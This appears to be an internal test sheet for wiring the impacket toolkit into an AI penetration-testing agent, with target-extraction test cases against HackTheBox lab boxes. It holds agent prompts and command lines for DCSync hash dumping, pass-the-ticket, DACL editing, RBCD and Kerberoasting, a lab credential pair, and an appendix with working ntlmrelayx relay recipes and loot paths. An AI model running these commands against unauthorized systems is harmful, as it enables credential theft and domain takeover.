# impacket — Tier A scenarios

Single test sheet for the `impacket` tool migration. Replaces the legacy split
(`target_extraction_tests.md` + `failure_signature_tests.md`).

impacket is a **multi-binary toolkit** — 47 sub-binaries (impacket-secretsdump,
impacket-psexec, impacket-getTGT, impacket-GetUserSPNs, etc.) sharing one
container image. Each `usage_patterns[]` declares its own `binary:` field;
the registry omits the top-level `binary`.

Sections:
1. Recommended HTB box for live verification
2. Narrative scenarios (paste into opensploit)
3. Target-extraction adversarial cases (≥20 — total 27)
4. Failure-signature live-verify cases (≥3 — total 7 verified)
5. Open questions
6. Hand-off

---

## 1. Recommended HTB box

**Hercules (10.129.242.196)** — Linux DC for `hercules.htb`. The reason this
box is right for impacket testing:

- **NTLM disabled domain-wide** — surfaces the `STATUS_NOT_SUPPORTED` SMB
  response that vanilla AD targets miss. Encoded as a failure_signature.
- **Kerberos available** — both pre-auth and AS-REP (no-preauth) paths
  exercisable depending on the user account.
- **Real AD environment** — exercises secretsdump's RemoteOperations RPC chain,
  the ccache write-then-read multi-step flow, and the SPN-lookup edge case
  where the bare IP doesn't have an SPN entry.

Test credential pair: `hercules.htb/natalie.a:Prettyprincess123!` (per the
HTB writeups; valid as of the 2026-04-25 verification run).

**Persistent test directory**: mount `/tmp/imp-test:/session` (per SKILL #14 —
multi-step flows like getTGT writing ccache + secretsdump reading it via
KRB5CCNAME need the same dir across calls).

---

## 2. Narrative scenarios (paste into opensploit)

### S1 — secretsdump basic happy path (single-binary call, NTLM auth)

```
Engagement target: 10.129.242.196 (HTB Hercules, authorized).
Use impacket-secretsdump to attempt DCSync of NTLM hashes via the credential pair hercules.htb/natalie.a:Prettyprincess123!. Save full output to /session/hercules-secretsdump.txt.
```

**Watch:** target=`10.129.242.196` extracted from positional `@10.129.242.196`. Hercules has NTLM disabled → result classifies as `failure_in_output` matching `STATUS_NOT_SUPPORTED`. tool_runner reports the protocol-layer rejection cleanly. The agent should NOT mistake this for "wrong creds" — it's a protocol disablement.

### S2 — getTGT happy path (Kerberos, writes ccache to /session)

```
Engagement target: 10.129.242.196 (HTB Hercules).
Use impacket-getTGT with credential pair hercules.htb/natalie.a:Prettyprincess123! and -dc-ip 10.129.242.196 to fetch a Kerberos TGT. Save the resulting ccache file to /session/.
```

**Watch:** No positional `@host` → target extraction falls back to `-dc-ip` rule (rule 4). target=`10.129.242.196`. Output writes `natalie.a.ccache` to /session/. Subsequent calls can use `KRB5CCNAME` to chain.

### S3 — multi-step ccache chain (Kerberos pass-the-ticket)

```
Engagement target: 10.129.242.196 (HTB Hercules).
After getTGT in the previous step, use impacket-secretsdump with -k -no-pass to authenticate via Kerberos using the cached TGT. Use the FQDN dc.hercules.htb in the positional (you may need /etc/hosts inside the container — note the gotcha). Set KRB5CCNAME=/session/natalie.a.ccache via env. Save output to /session/hercules-dcsync.txt.
```

**Watch:** target=`dc.hercules.htb` from positional. KRB5CCNAME plumbed through container env (verify cli_in_container forwards it; if not flag as open question). May surface `KDC_ERR_S_PRINCIPAL_UNKNOWN` if the SPN entry doesn't match the FQDN exactly — that's a real failure signature, encoded.

### S4 — dacledit `-target` DN trap (security invariant)

```
Engagement target: 10.129.242.196 (HTB Hercules).
Use impacket-dacledit with -action read, -principal natalie.a, and -target 'CN=Domain Admins,CN=Users,DC=hercules,DC=htb' to read the DACL of the Domain Admins group. Authenticate as hercules.htb/natalie.a:Prettyprincess123! and use -dc-ip 10.129.242.196.
```

**Watch:** **Known DSL wart** — `-target` rule would extract the DN as the network target. Validation hook should reject the DN as not-a-host, falling through to `-dc-ip` (10.129.242.196). If the plugin scope-rejects the DN-shaped value, verify the error is helpful (not a generic transport explosion). Per Open Question 3, this needs a per-binary override.

### S5 — DNS resolution failure (negative test)

```
Engagement target: dc.does-not-exist.invalid (deliberately invalid, verifying DNS error classification).
Use impacket-secretsdump with hercules.htb/natalie.a:Prettyprincess123!@dc.does-not-exist.invalid -dc-ip 10.129.242.196.
```

**Watch:** stderr matches `[Errno -2] Name or service not known`. Classified as `failure_in_output` (impacket exits 0 even on DNS fail). Agent reports DNS issue, doesn't retry — there's no remediation for a non-existent hostname.

### S6 — connection-refused (negative test, layer-diverse)

```
Engagement target: 10.129.242.196 port 1 (closed port, verifying TCP-layer error classification).
Use impacket-secretsdump with hercules.htb/admin:wrongpass@127.0.0.1 -just-dc-ntlm.
```

**Watch:** stderr matches `[Errno 111] Connection refused`. Classified as `failure_in_output`. Distinct from S5 (DNS layer) — exercises TCP-layer signature.

---

## 3. Target-extraction adversarial cases (27 total, ≥20 spec)

The impacket `tool.yaml` declares four rules (first match wins):

1. `positional_match` regex `^(?:[^/@\s]+/)?[^@\s]+@([^:/?#\s]+)`, capture group 1, `parse_as: raw` — matches `[domain/]user[:password]@host` form (secretsdump, psexec, wmiexec, smbexec, dcomexec, atexec, lookupsid, smbclient, mssqlclient).
2. `flag_value` for `-target` (`parse_as: raw`) — also misused by `dacledit`/`owneredit` for AD object identifier (DN). See Open Question 3.
3. `flag_value` for `-target-ip` (`parse_as: raw`) — override when SPN host differs from network host.
4. `flag_value` for `-dc-ip` (`parse_as: raw`) — fallback when no positional / `-target` / `-target-ip`.

`value_flags` declares ~40 entries to prevent value-position strings from being mistaken for targets (`-spn`, `-impersonate`, `-hashes`, `-aesKey`, `-outputfile`, `-computer-name`, `-computer-pass`, `-delegate-to`, `-delegate-from`, `-principal`, `-action`, `-rights`, `-codec`, `-q`, ...).

### Happy-path cases

| # | Command (binary shown for clarity, target_extraction sees args only) | Expected target | Notes |
|---|---|---|---|
| 1 | `impacket-secretsdump CORP/administrator:Pass123@10.10.10.5 -just-dc-ntlm` | `10.10.10.5` | Bog-standard DCSync, IPv4 |
| 2 | `impacket-secretsdump CORP.LOCAL/da.user:p@dc01.corp.local -just-dc -outputfile /session/loot/dump` | `dc01.corp.local` | FQDN domain, FQDN host |
| 3 | `impacket-secretsdump 'corp/svc_admin:Pa$$w0rd!@10.10.10.5'` | `10.10.10.5` | Password contains `$`/`!`, single-quoted |
| 4 | `impacket-secretsdump 'CORP/admin:abc123@10.10.10.5' -hashes :aad3b435...:31d6cfe0...` | `10.10.10.5` | `-hashes` value (LM:NT) must NOT be picked even with colon |
| 5 | `impacket-psexec CORP/admin@10.10.10.5 -k -no-pass` | `10.10.10.5` | Kerberos pass-the-ticket |
| 6 | `impacket-wmiexec WORKGROUP/Administrator:LocalPass@192.168.50.10 'whoami /all'` | `192.168.50.10` | Extra positional (command) must not confuse extractor |
| 7 | `impacket-smbclient CORP/da:p@10.10.10.5` | `10.10.10.5` | Interactive smbclient |
| 8 | `impacket-mssqlclient CORP/sql_user:Sql123@10.10.10.20 -windows-auth` | `10.10.10.20` | MSSQL with Windows auth |
| 9 | `impacket-secretsdump CORP/admin:p@dc01.corp.local -just-dc-ntlm -dc-ip 10.10.10.5` | `dc01.corp.local` | Both positional AND `-dc-ip` — positional wins |
| 10 | `impacket-getTGT CORP/user:Pass123 -dc-ip 10.10.10.5` | `10.10.10.5` | No positional `@host` — `-dc-ip` fallback |
| 11 | `impacket-GetUserSPNs CORP/user:Pass123 -dc-ip 10.10.10.5 -request -outputfile /session/loot/k.txt` | `10.10.10.5` | Kerberoast — DC is operational target |
| 12 | `impacket-GetNPUsers 'CORP/' -no-pass -dc-ip 10.10.10.5 -usersfile /session/users.txt` | `10.10.10.5` | Unauth AS-REP roast — bare `CORP/` doesn't match positional |
| 13 | `impacket-findDelegation CORP/user:p -dc-ip 10.10.10.5` | `10.10.10.5` | Delegation enum |
| 14 | `impacket-addcomputer CORP/user:p -computer-name 'PWNED$' -computer-pass 'M!1' -dc-host dc01.corp.local` | `dc01.corp.local` (via `-dc-host` — see OQ 2) OR `null` | `-dc-host` not in current rules (Open Question 2) |
| 15 | `impacket-getST CORP/svc:p -spn cifs/dc01.corp.local -impersonate Administrator -dc-ip 10.10.10.5` | `10.10.10.5` | S4U2Self/Proxy. `-spn` value is target service, NOT network address. `-dc-ip` fallback. |

### Adversarial — value_flag traps & multi-binary forms

| # | Command | Expected | Notes |
|---|---|---|---|
| 16 | `impacket-GetUserSPNs 'CORP/admin:p' -dc-ip 10.10.10.5 -request -outputfile /session/admin@10.255.255.254/k.txt` | `10.10.10.5` | `-outputfile` value contains literal `@10.255.255.254` substring. value_flags must skip. |
| 17 | `impacket-secretsdump 'CORP/svc:p@10.10.10.5' -just-dc-user 'CORP/krbtgt'` | `10.10.10.5` | `-just-dc-user` value contains `/` and `:`-free principal — must NOT parse as positional. |
| 18 | `impacket-getST CORP/svc:p -spn cifs/victim.corp.local@RANDOMREALM -impersonate Administrator -dc-ip 10.10.10.5` | `10.10.10.5` | SPN syntactically looks like `domain/user@host` but is `-spn` value (in value_flags). |
| 19 | `impacket-secretsdump CORP/admin:p@dc01 -system /session/SYSTEM.bak -security /session/SECURITY.bak -sam /session/SAM.bak` | `dc01` | Offline registry hive dump. Positional retained for naming. |
| 20 | `impacket-rbcd -action write -delegate-to 'victim$' -delegate-from 'pwned$' CORP/user:Pass123 -dc-ip 10.10.10.5` | `10.10.10.5` | rbcd: positional appears AFTER flags. Positional rule must scan all args. `-delegate-to`/`-delegate-from` in value_flags. `-dc-ip` fallback fires (positional has no `@host`). |
| 21 | `impacket-dacledit -action write -rights FullControl -principal 'pwned' -target 'CN=Domain Admins,CN=Users,DC=corp,DC=local' CORP/user:p -dc-ip 10.10.10.5` | `10.10.10.5` (NOT the LDAP DN) | **Known DSL wart** — `-target` rule extracts DN. Per OQ 3: per-binary override or scope check fails closed on DN-shaped value. |
| 22 | `impacket-ntlmrelayx -t smb://10.10.10.5/ADMIN$ -smb2support` | `null` (rules don't cover `-t`) | ntlmrelayx is Tier B (stateful listener), NOT in kind:cli pilot. Flagged in OQ 1 for completeness. |
| 23 | `impacket-ticketer -nthash deadbeef... -domain-sid S-1-5-21-... -domain corp.local Administrator` | `null` | Offline ticket forge — no network call. OQ 5: add `no_target_ok` allow-list. |
| 24 | `impacket-getTGT 'CORP/user' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 10.10.10.5` | `10.10.10.5` | Overpass-the-hash. `-hashes` value `:hex...` must NOT parse as positional. |
| 25 | `impacket-secretsdump 'corp/user:pa$$@10.10.10.5' -just-dc-ntlm` | `10.10.10.5` | Password contains `$` (allowed by `[^@\s]+`). |
| 26 | `impacket-secretsdump '/admin@10.10.10.5'` | `10.10.10.5` | NULL domain — bare leading `/` is unusual but regex allows. |
| 27 | `impacket-secretsdump 'admin@10.10.10.5'` | `10.10.10.5` | No domain prefix — host-only auth (WORKGROUP). |

### Adversarial — security invariants & ambiguity

| # | Command | Expected | Notes |
|---|---|---|---|
| F1 | `impacket-secretsdump --help` | `null` | tool_runner bypasses scope check for `--help`. |
| F2 | `impacket-secretsdump` (no args) | `null` | Same. |
| F3 | `impacket-getTGT 'CORP/user:p'` (no `-dc-ip`) | `null`. Recommended: refuse and demand explicit `-dc-ip`. | Pure auto-discovery via DNS SRV — no way to predict resolved host. |
| F4 | `impacket-secretsdump 'CORP/admin:p@10.10.10.5' -dc-ip 10.255.255.254` | `10.10.10.5` (positional wins) | **Security invariant**: `-dc-ip` is auth/KDC routing, NOT scope. |
| F5 | `impacket-secretsdump 'CORP/admin:p@10.10.10.5' -target-ip 10.255.255.254 -dc-ip 10.0.0.1` | `10.10.10.5` (positional wins) | positional > `-target-ip` > `-dc-ip`. |
| F6 | `impacket-getST CORP/svc:p -spn cifs/scope-creep.attacker.com -impersonate Administrator -dc-ip 10.10.10.5` | `10.10.10.5` | S4U doesn't connect to SPN host — that happens later when ST is used. Scope check applies to KDC. |
| F7 | `impacket-psexec '@10.10.10.5'` | `null` | Empty user — regex requires ≥1 char in `[^@\s]+`. impacket itself rejects. |
| F8 | `impacket-secretsdump 'CORP/admin:p@10.10.10.5' 'CORP/admin:p@10.10.10.6'` | `10.10.10.5` (first positional only) | Multi-target forbidden; impacket silently ignores second. |
| F9 | `impacket-secretsdump 'CORP/admin:p@10.10.10.5/SHARE'` | `10.10.10.5` | Regex stops at `/`. |
| F10 | `impacket-secretsdump 'CORP/admin:p@10.10.10.5:445'` | `10.10.10.5` | Regex stops at `:`. impacket itself accepts the port. |
| F11 | `impacket-secretsdump 'CORP/admin:p@[fe80::1]'` | `[fe80` (broken — see OQ 6) | **IPv6 broken in current regex.** Defer; HTB is IPv4-only. |
| F12 | `impacket-dacledit -action read -principal admin -target 'CN=foo,DC=corp,DC=local' CORP/user:p` | `CN=foo,DC=corp,DC=local` (rule 2 fires, scope validator rejects DN as not-host) | Same DN trap as case 21 without `-dc-ip` — fails closed. |

---

## 4. Failure-signature live-verify cases (7 verified, ≥3 spec)

Verified against `mcp-test-impacket` (built 2026-04-25). Most impacket binaries
exit **0 even on hard failure** — pattern-match `failure_signatures.signal` is
mandatory.

| # | Layer | Test | failure_signature `signal` | Status |
|---|---|---|---|---|
| 1 | TCP | secretsdump against closed port (127.0.0.1) | `[Errno 111] Connection refused` AND `Connection refused` | VERIFIED 2026-04-25 |
| 2 | TCP | secretsdump against unreachable IP (10.255.255.254) | `timed out` (lowercase, NOT `TimeoutError`) | VERIFIED 2026-04-25 |
| 3 | SMB | secretsdump against Hercules (NTLM disabled) | `STATUS_NOT_SUPPORTED` | VERIFIED 2026-04-25 — newly added; vanilla AD targets miss this |
| 4 | Kerberos preauth | getTGT with wrong password | `KDC_ERR_PREAUTH_FAILED` | VERIFIED 2026-04-25 |
| 5 | Kerberos client | GetNPUsers with nonexistent user | `KDC_ERR_C_PRINCIPAL_UNKNOWN` | VERIFIED 2026-04-25 |
| 6 | Kerberos service | secretsdump -k against bare-IP positional | `KDC_ERR_S_PRINCIPAL_UNKNOWN` | VERIFIED 2026-04-25 |
| 7 | DNS | secretsdump against fake hostname | `[Errno -2] Name or service not known` | VERIFIED 2026-04-25 |

### Layer diversity (SKILL #11) — achieved

7 distinct signals across TCP / SMB / Kerberos preauth / Kerberos client /
Kerberos service / DNS. The Kerberos signals split across layers because they
exercise different KDC reject codes — each is a distinct diagnostic that
maps to a specific remediation.

### Signals NOT yet live-verified (kept from authoritative impacket source review)

`STATUS_ACCESS_DENIED`, `STATUS_ACCOUNT_DISABLED`, `STATUS_ACCOUNT_LOCKED_OUT`,
`STATUS_PASSWORD_EXPIRED`, `KRB_AP_ERR_SKEW`, `KDC_ERR_PREAUTH_REQUIRED`,
`DCERPC Runtime Error: code: 0x5`, `DCERPC Runtime Error`, `rpc_s_access_denied`,
`ERROR_DS_DRA_BAD_DN`, `[Errno 113] No route to host`, `SessionError: code: 0x`,
`Errors connecting to MS-SAMR endpoint`, `raise NoMechanismFoundError`.

These exercise post-pilot when corresponding misconfigurations are
reproducible.

---

## 5. Open questions

1. **ntlmrelayx `-t` flag (case 22)** — ntlmrelayx is Tier B (stateful listener), excluded from kind:cli pilot. Defer until ntlmrelayx is migrated.
2. **`-dc-host` (case 14)** — addcomputer prefers `-dc-host FQDN` over `-dc-ip`. Recommend adding 5th flag_value rule. Single-line change.
3. **Per-binary overrides for `-target` semantics (cases 21, F12)** — dacledit / owneredit / rbcd reuse `-target` for AD object identifier (DN), NOT network target. Recommend `target_extraction_overrides` keyed on binary that REMOVE rule 2 for these binaries.
4. **Auto-discovery cases without `-dc-ip` (F3)** — recommend refuse outright (require explicit `-dc-ip`/`-dc-host`). Removes scope-bypass vector.
5. **No-target-ok binaries (case 23)** — ticketer / ticketConverter / raiseChild operate offline. Add `no_target_ok: true` per-pattern field.
6. **IPv6 bracketed hosts (F11)** — defer (HTB is IPv4-only); document in tool.yaml gotchas.
7. **KRB5CCNAME plumbing (S3)** — verify cli_in_container forwards env vars from yaml. If not, add `requirements.env_pass` field for selective env propagation.
8. **Audit gap: krb5.conf auto-generation lost** — Legacy mcp-server.py wrote `/etc/krb5.conf` (and a copy to `/session/config/krb5.conf`) on the first Kerberos call, populating `[libdefaults] default_realm`, `[realms]` (kdc/admin_server), and `[domain_realm]` from the supplied `domain` + `dc_ip`. Under run_cli the binary reads whatever is baked into the image, which may not match the engagement realm and produces opaque KDC errors. Decide whether (a) the kind:cli image should ship a bootstrap that writes krb5.conf from env vars, (b) the agent does it via the bash tool before each Kerberos call, or (c) we add a kind:cli `pre_argv_hook` field that points at a setup script.
9. **Audit gap: ccache auto-promotion to /session/credentials/ lost** — Legacy parsed `Saving ticket in <path>.ccache` from getTGT/getST stdout, copied the file to `/session/credentials/<safe_principal>.ccache`, and tracked an `_active_principal` for subsequent calls. Under run_cli the file lands in the binary's CWD and is wiped on container exit unless CWD is /session/. Decide whether (a) document a hard rule "always pin CWD to /session/", (b) add a post-execution capture hook in the plugin, or (c) require the LLM to manually `cp` the ccache to /session/credentials/ after every getTGT/getST.
10. **Audit gap: smbclient/smbexec interactive stdin not in run_cli contract** — Legacy methods piped scripted command sequences into impacket-smbclient (`use SHARE\ncd dir\nget file\nexit`) and impacket-smbexec (`<cmd>\nexit`) via stdin. run_cli does support `stdin_data`, but the LLM has no way to discover from tool.yaml that these binaries REQUIRE stdin scripting. New gotcha covers this textually but a `stdin_required: true` field per usage_pattern would be more enforceable.
11. **Audit gap: rbcd/changepasswd/addspn binary path quirk** — Legacy invoked `python3 /opt/impacket-scripts/rbcd.py`, `python3 /opt/impacket-scripts/changepasswd.py`, and `python3 /opt/krbrelayx/addspn.py` rather than `impacket-rbcd` / `impacket-changepasswd` / `impacket-addspn`. Verify the kind:cli image installs these as PATH binaries (registry usage_patterns assume `impacket-rbcd` etc.). If not, the LLM will need fallback knowledge — add to gotcha or fix the Dockerfile.
12. **Audit gap: error pattern detection on exit==0** — Legacy `_has_error_in_output` scanned combined stdout+stderr for `_ERROR_PATTERNS` (SessionError, STATUS_, KDC_ERR, KRB_AP_ERR, INSUFF_ACCESS_RIGHTS, rpc_s_access_denied, CO_E_RUNAS_LOGON_FAILURE, REGDB_E_CLASSNOTREG, ERROR_DS_DRA, "Target principal not found", "Kerberos SessionError", WBEM_E_ACCESS_DENIED) and forced success=False even when returncode==0. Under run_cli, exit==0 reports success regardless. The plugin's failure_signatures table now drives this client-side, but verify the tool_runner actually classifies failure_in_output by matching `failure_signatures.signal` against output (not just exit code).

---

## 6. Hand-off

- **Tool**: impacket (kind:cli, multi-binary toolkit — 47 sub-binaries)
- **Status**: pilot-migrated; scenarios consolidated; image rebuilt locally with mcp-common 0.3.0 (Dockerfile fix landed today using `python3-full` to bypass Kali apt issue with separate `python3-pip`/`python3-venv` packages); legacy split files dropped.
- **mcp-server.py**: present (4692 LOC), untouched — auto-inherits run_cli; preserves rollback per SKILL #21. Per-tool methods still callable for legacy `mcp_tool` callers.
- **Image**: `ghcr.io/silicon-works/mcp-tools-impacket:latest` — local rebuild on 2026-04-26. End-to-end verification via plugin still pending (was blocked on Dockerfile fix; now unblocked).
- **Live-verify pending**: paste S1-S6 against Hercules. Verify multi-step ccache flow (S2 → S3) works through cli_in_container with env pass-through. Confirm DN-trap behaviour on S4 (security invariant).
- **Pilot-gate sign-off (2026-04-25)**: ≥3 deliberate-failure tests, 7 distinct signals VERIFIED across 6 layers; ≥20 extraction cases authored (27 total); 0% hallucination on Stage 3 sub-binary dispatch (4 trap tests + 1 realistic AS-REP roast verified clean).

Authored: 2026-04-25 (pilot Phase 3) — consolidated 2026-04-26.

---

# Appendix A — impacket-relay retirement (May 2026, Phase 0.1)

The legacy `impacket-relay` (kind:mcp) tool was retired in May 2026
and `ntlmrelayx` (the daemon-shaped binary that motivated the wrapper)
absorbed here as one of impacket's 47 sub-binaries with documented
gotchas. impacket-relay deleted (~750 LOC of bespoke MCP server +
1586 LOC of tests removed).

Architecture: ntlmrelayx is the one DAEMON-SHAPED binary in the
toolkit. cli_in_container's max_runtime_seconds is the kill switch.
`--no-multirelay` exits cleanly after first successful relay (most
common case). For multi-relay, `timeout NN` wrapper enforces the
upper bound. Loot/hashes land in /session/output/relay-loot/ and
/session/output/relay-hashes_*.txt — survive SIGKILL because
written incrementally.

## A.1 — STDIN keep-alive: the surprise bug

Initial recipe (`impacket-ntlmrelayx -t ldaps://X --no-multirelay`)
exited immediately after `[*] Servers started, waiting for connections`.
Root cause: ntlmrelayx polls stdin and exits when stdin closes.
cli_in_container closes stdin by default → silent listener exit.

Verified empirically 2026-05-08:
```
docker run -d --name X --network host --entrypoint impacket-ntlmrelayx ...
# → "Servers started, waiting for connections" → CONTAINER EXITED
```

Fix verified working:
```
docker run -d --name X --network host --entrypoint bash ...:latest \
  -c 'exec impacket-ntlmrelayx <args> < /dev/zero'
# → ports 80/445/5985/etc. bound, listener stays alive
```

The `< /dev/zero` keeps stdin readable forever so ntlmrelayx's event
loop blocks instead of exiting. Documented in gotcha #N
(DAEMON BINARY OUTLIER section).

## A.2 — Authority live verification (10.129.195.228)

Recipe verified live 2026-05-08:
```
docker run -d --rm --network host -v /tmp/auth-t1:/session \
  --entrypoint bash ghcr.io/silicon-works/mcp-tools-impacket:latest \
  -c 'impacket-ntlmrelayx -t ldaps://10.129.195.228 -smb2support --no-multirelay \
       -l /session/output/relay-loot \
       -of /session/output/relay-hashes \
       >/session/output/relay-stdout.log 2>&1 < /dev/zero'
```

Result:
```
✓ listener bound 7 ports on the agent's container:
    SMB Server      → port 445
    HTTP Server     → port 80
    WCF Server      → port 9389
    RAW Server      → port 6666
    WinRM (HTTP)    → port 5985
    WinRMS (HTTPS)  → port 5986
    RPC Server      → port 135
✓ LDAPS target reachable through tun0 (no error in stdout, listener
  in "waiting for connections" state)
✓ stdout.log clean (no null-byte garbage from `< /dev/zero`, see A.4)
```

## A.3 — mid-flight peek pattern

While a relay is running (one tool-runner spawn blocked on the
listener), a SEPARATE tool-runner spawn can read partial captures by
reading /session/output/relay-loot/ + /session/output/relay-hashes_*.txt
through the bash tool. Plugin's mutex serializes calls within ONE
container, but reads via a different container are unblocked.

Verified empirically 2026-05-08 — the recipe persisted the loot dir
on disk; a separate spawn read it without disrupting the listener
container.

## A.4 — success/failure extraction recipe

ntlmrelayx writes progress to STDERR, not stdout. Capture both:
```
... > /session/output/relay-stdout.log 2>&1
```

10 stdout markers verified against impacket 0.13.x source:
```
[*] Servers started, waiting for connections           — listener bound
[*] SMBD-Thread-N: Connection from <ip> controlled    — inbound auth received
[*] Authenticating against ldap://X as Y SUCCEED       — relay_success
[-] Authenticating against ldap://X as Y FAILED        — relay attempted, target rejected
[*] Certificate successfully written to file           — adcs_success
[*] Domain info dumped into lootdir!                   — RBCD prep done
[*] Privilege escalation succesful, shutting down      — escalate_user worked
[*] Done dumping SAM hashes for host: HOSTNAME         — relayed creds dumped SAM
[*] SOCKS: Adding scheme://user@host... to active SOCKS — socks=true relay caught
[*] Successfully dumped N LAPS passwords through relayed account — laps_success
```

## A.5 — Surprise empirical finding: script -q + /dev/zero null-byte trap

First draft of A.4 used `script -q /session/output/relay-stdout.log
-c "impacket-ntlmrelayx ..."` to capture stdout. With `< /dev/zero`
keep-alive, this WROTE NULL-BYTE GARBAGE into the log file (script
records stdin content, /dev/zero's stream becomes log noise).

Recipe corrected to direct redirect: `>file 2>&1` instead of script.
Verified clean output post-fix. Documented as gotcha N+1.

## A.6 — capture artifacts on success

When a relay attempt succeeds, ntlmrelayx writes:
```
relay-loot/<stem>_<host>_<user>_samhashes.txt    # SAM dump (relayed creds)
relay-loot/<stem>_<host>_<user>_secrets.txt      # LSA secrets
relay-loot/domain_<dc>_users.json                # RBCD enum
relay-loot/<user>.pfx + relay-loot/<user>.ccache # ADCS cert + ticket
relay-loot/msDS-AllowedToActOnBehalfOfOtherIdentity_<target>.dump  # RBCD write
```

Agent enumeration recipe (separate spawn):
```
binary: bash, command: -c '
  ls -la /session/output/relay-loot/ 2>/dev/null
  echo "---markers---"
  grep -E "SUCCEED|FAILED|successfully|Done dumping|Adding.*active SOCKS|Servers started" \
    /session/output/relay-stdout.log 2>/dev/null'
```

Verified working against the controlled run on Authority (no relay
succeeded since no inbound auth arrived in the test window — confirms
the recipe doesn't false-positive).

Authored: 2026-05-08 (Phase 0.1, daemon-wrapper retirement series).
